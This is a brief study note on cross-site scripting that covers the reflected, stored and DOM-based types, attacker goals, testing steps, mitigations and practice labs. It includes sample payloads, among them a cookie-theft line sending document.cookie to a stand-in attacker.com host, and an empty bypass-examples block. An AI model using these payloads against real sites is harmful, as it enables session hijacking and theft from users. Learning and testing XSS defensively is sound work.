---
layout: default
title: XSS Basics
---

# Cross-Site Scripting (XSS) Basics

## What is XSS
XSS allows attackers to inject client-side scripts into web pages viewed by other users.

## Types of XSS

### Reflected XSS
- Payload is in the URL or request
- Not stored; reflects back immediately
- Example: search box that echoes your input

### Stored XSS
- Payload is saved in the database
- Executes for every user who visits the page
- Example: a comment or profile field

### DOM-based XSS
- Happens entirely in the browser
- JavaScript reads from the URL and writes to the DOM
- No server interaction needed

## Basic Payload
```html
alert('XSS')
```

## What Attackers Can Do
- Steal session cookies
- Redirect users to phishing sites
- Log keystrokes
- Deface pages
- Perform actions as the victim user

## Cookie Theft Example
```html
document.location='http://attacker.com/?c='+document.cookie
```

## Bypass Examples
When `<script>` is filtered:
```html



```

## How to Test
1. Look for user-controlled input reflected in the page
2. Try `<script>alert(1)</script>` in input fields and URL params
3. Check how the app handles `<`, `>`, `"`, `'`
4. Use Burp Suite to modify requests

## Mitigations
- Output encoding (HTML encode user input before rendering)
- Content Security Policy (CSP)
- HTTPOnly and Secure flags on cookies
- Input validation

## Practice Labs
- PortSwigger Web Academy: XSS labs (free)
- TryHackMe: XSS room

## Key Terms
- DOM: Document Object Model
- Payload: the injected script
- CSP: Content Security Policy
- HTTPOnly: cookie flag that blocks JS access
